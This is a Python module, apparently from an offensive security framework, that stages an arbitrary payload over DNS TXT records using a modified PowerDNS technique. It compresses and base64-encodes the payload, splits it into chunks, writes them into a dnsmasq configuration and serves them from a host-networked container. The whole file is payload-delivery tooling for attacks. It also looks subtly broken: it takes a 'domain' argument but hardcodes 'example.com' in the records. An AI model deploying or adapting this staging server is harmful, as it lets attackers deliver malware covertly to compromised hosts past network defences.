from lets.__module__ import Module, Mount, Container
import base64, gzip 


class PowerDNS(Module):
    """
    Stage a payload over DNS TXT records using a modified version
    of MDSec's PowerDNS technique.

    Modification: 0th record returns length, not powershell payload
    """
    images = [
        "local/dnsmasq:1.0.0",      # Cross-platform
        ]

    @classmethod
    def add_arguments(self, parser):
        parser.add_argument("domain", type=str, help="stage under domain")
        parser.add_argument("-p", "--port", type=int, default=53,
            help="listen on port (%(default)i)")
        parser.add_argument("--interface", type=str, default="0.0.0.0",
            help="listen on interface (%(default)s)")
        parser.add_argument("-z", "--compress", action="store_true",
            help="gzip payload")
        parser.add_argument("-u", "--upstream", type=str, action="append",
            help="forward requests to upstream DNS servers")

    def handle(self, input, domain, port=53, interface="0.0.0.0", compress=False, upstream=None):
        assert input is not None, "Must provide a payload as input"

        for data in input:

            # Compress payload
            if compress:
                self.log.debug("Compressing %i bytes", len(data))
                data = gzip.compress(data, compresslevel=9)

            # Encode payload
            self.log.debug("Base64 encoding %i bytes", len(data))
            encoded = base64.b64encode(data).decode()

            # Split payload into chunks
            c = 250
            n,m = divmod(len(encoded), c)
            self.log.debug("Splitting %i bytes into %i chunks", len(encoded), n+1)
            chunks = []
            for i in range(0, len(encoded), c):
                chunks.append(encoded[i:i+c])

            with Mount("/data") as mount:

                # Construct command
                cmd  = "dnsmasq -C /data/dnsmasq.conf -d"

                # Write configuration
                with mount.open("dnsmasq.conf", "w") as f:
                    f.write("port=%i\n" % port)
                    f.write("listen-address=%s\n" % interface)
                    f.write("bind-interfaces\n")
                    f.write("log-queries\n")
                    
                    # Add TXT records
                    f.write("txt-record=0.example.com,\"%i\"\n" % len(chunks))
                    for i, chunk in enumerate(chunks):
                        f.write("txt-record=%i.example.com,\"%s\"\n" % (i+1, chunk))

                    # Add upstream servers
                    f.write("no-resolv\n")      # Don't read /etc/resolv.conf
                    if upstream:
                        if not isinstance(upstream, list):
                            upstream = [upstream]
                        for server in upstream:
                            f.write("server=%s\n" % server)

                    # Add hosts
                    f.write("no-hosts\n")       # Don't read /etc/hosts

                # Launch dnsmasq
                with Container.run("local/dnsmasq:1.0.0",
                    stdin_open=True,
                    tty=True,
                    network="host",
                    volumes=mount.volumes,
                    command=cmd) as container:

                    container.interact()
